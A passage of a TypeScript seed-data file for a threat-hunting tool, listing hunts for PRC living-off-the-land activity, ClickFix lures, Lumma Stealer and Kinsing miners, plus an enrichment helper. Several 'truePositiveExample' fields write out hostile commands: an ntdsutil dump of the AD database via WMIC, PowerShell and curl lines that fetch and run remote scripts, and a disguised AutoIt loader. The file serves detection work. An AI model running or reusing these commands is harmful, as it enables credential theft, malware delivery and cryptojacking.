    dataSourcesRequired: ['EDR - CrowdStrike Falcon', 'Windows Event 4688 / Sysmon 1'],
    summaryAndRationale:
      'PRC state-sponsored actors pre-position in defense and critical-infrastructure networks using only built-in tools: ntdsutil to copy the AD database, netsh portproxy to tunnel traffic through compromised hosts, and WMIC for remote execution. There is no malware to find, so hunting on these command patterns is the main way to surface them.',
    suggestedQuery: { language: 'KQL', code: '' },
    expectedBaseline: 'ntdsutil IFM runs only during documented DC backup or promotion windows; netsh portproxy rules are rare and tied to change tickets.',
    truePositiveExample: 'wmic.exe /node:ENG-FS02 process call create "cmd /c ntdsutil \\"ac i ntds\\" ifm \\"create full C:\\Windows\\Temp\\x\\" q q"',
    aiHuntScore: score(97, 95, 88, 90, 72),
    generatedAt: '2026-09-28T07:15:00Z',
  },
  {
    id: 'th-8',
    clientId: 'client-vanguard-fin',
    source: 'ClickFix',
    sourceReference: 'ClickFix fake CAPTCHA / "verify you are human" lures',
    priority: 'High',
    hypothesisName: 'ClickFix: users pasting PowerShell or mshta commands into the Run dialog from fake CAPTCHA pages',
    techniques: [
      { id: 'T1204.004', name: 'Malicious Copy and Paste', tactic: 'Execution' },
      { id: 'T1218.005', name: 'Mshta', tactic: 'Defense Evasion' },
      { id: 'T1059.001', name: 'PowerShell', tactic: 'Execution' },
    ],
    dataSourcesRequired: ['EDR - Microsoft Defender for Endpoint', 'Proxy / Web Gateway Logs'],
    summaryAndRationale:
      'ClickFix pages imitate CAPTCHA or error prompts and tell the user to press Win+R, paste a copied command and hit Enter. The command (PowerShell, mshta or curl) downloads an infostealer or RAT. Because the user runs it, the process tree is explorer.exe → script host, which is rare in normal use.',
    suggestedQuery: { language: 'KQL', code: '' },
    expectedBaseline: 'Explorer rarely launches PowerShell or mshta with URLs; IT admin scripts run from managed tooling, not the Run dialog.',
    truePositiveExample: 'explorer.exe → powershell.exe -w h -c "iwr hxxps://verify-captcha[.]online/c.txt | iex"  # ✅ I am not a robot - reCAPTCHA ID 4821',
    aiHuntScore: score(90, 100, 82, 94, 76),
    generatedAt: '2026-09-28T07:15:00Z',
  },
  {
    id: 'th-9',
    clientId: 'client-apex-health',
    source: 'Malware',
    sourceReference: 'Lumma Stealer (LummaC2) AutoIt loader chains',
    priority: 'High',
    hypothesisName: 'Lumma Stealer: AutoIt interpreters and renamed .pif/.com loaders running from user-writable folders',
    techniques: [
      { id: 'T1059.010', name: 'AutoHotKey & AutoIT', tactic: 'Execution' },
      { id: 'T1036', name: 'Masquerading', tactic: 'Defense Evasion' },
      { id: 'T1555.003', name: 'Credentials from Web Browsers', tactic: 'Credential Access' },
    ],
    dataSourcesRequired: ['EDR - CrowdStrike Falcon', 'Windows Event 4688 / Sysmon 1'],
    summaryAndRationale:
      'Lumma and similar infostealers are often delivered as an AutoIt interpreter renamed to .pif or .com plus a compiled .a3x script, dropped into AppData or Temp. Stolen browser sessions from clinical staff can give attackers access to EHR and VPN portals.',
    suggestedQuery: { language: 'KQL', code: '' },
    expectedBaseline: 'Executables with .pif/.com/.scr extensions essentially never run from AppData or Temp on managed clinical workstations.',
    truePositiveExample: 'cmd.exe /c copy /b ..\\Lb + ..\\Yz Tennis.pif & start Tennis.pif q.a3x  (C:\\Users\\nurse01\\AppData\\Local\\Temp\\218410\\)',
    aiHuntScore: score(88, 95, 80, 92, 84),
    generatedAt: '2026-09-28T07:15:00Z',
  },
  {
    id: 'th-10',
    clientId: 'client-cloudnova-tech',
    source: 'Malware',
    sourceReference: 'Kinsing cryptomining campaigns against exposed container workloads',
    priority: 'Medium',
    hypothesisName: 'Kinsing: curl|sh downloads and cryptominer processes on EKS worker nodes',
    techniques: [
      { id: 'T1496', name: 'Resource Hijacking', tactic: 'Impact' },
      { id: 'T1105', name: 'Ingress Tool Transfer', tactic: 'Command and Control' },
      { id: 'T1059.004', name: 'Unix Shell', tactic: 'Execution' },
    ],
    dataSourcesRequired: ['Linux auditd / syslog', 'CloudTrail / Cloud Audit Logs'],
    summaryAndRationale:
      'Kinsing exploits exposed services (misconfigured Docker APIs, vulnerable web apps) and then pipes a downloaded script into sh to install the kdevtmpfsi miner and kill competing miners. It is noisy on CPU but often goes unnoticed on autoscaling clusters.',
    suggestedQuery: { language: 'KQL', code: '' },
    expectedBaseline: 'Container images are immutable; workloads do not download and execute scripts at runtime or connect to mining pools.',
    truePositiveExample: 'bash -c "curl -s http://195.3.x.x/d.sh | sh" followed by /tmp/kdevtmpfsi connecting to stratum+tcp://pool:3333',
    aiHuntScore: score(78, 90, 85, 80, 70),
    generatedAt: '2026-09-28T07:15:00Z',
  },
];

/** Apply queries, references and corrected source categories to a hunt (seed or previously saved). */
export function enrichHunt(hunt: TodayHunt, legacySource: Record<string, TodayHuntSource>): TodayHunt {
  const e = HUNT_ENRICHMENT[hunt.id];
  const source = e?.source ?? legacySource[hunt.source] ?? hunt.source;
  const refs = [...(e?.references ?? []), ...(hunt.references ?? [])];
  const references = refs.filter((r, i) => refs.findIndex((x) => x.url === r.url) === i);
  const platformQueries = { ...e?.platformQueries, ...hunt.platformQueries };
  // Seed hunts written only as platform queries: keep the legacy single-query field usable.
  const suggestedQuery = hunt.suggestedQuery?.code ? hunt.suggestedQuery : { language: 'KQL' as const, code: platformQueries.defender ?? '' };
  return {
    ...hunt,
    source,
    suggestedQuery,
    platformQueries,
    references,
  };
}
